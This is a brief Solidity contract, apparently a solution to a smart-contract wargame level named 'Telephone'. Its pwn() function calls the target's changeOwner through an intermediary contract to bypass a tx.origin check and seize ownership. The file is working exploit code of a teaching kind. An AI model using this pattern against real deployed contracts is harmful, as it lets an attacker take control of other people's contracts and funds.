pragma solidity ^0.4.18;

interface Telephone {
  function changeOwner(address) external;
}

contract BadPhone {
  address public telephone;

  function BadPhone(address _telephone) public {
    telephone = _telephone;
  }

  function pwn(address _owner) public {
    Telephone(telephone).changeOwner(_owner);
  }
}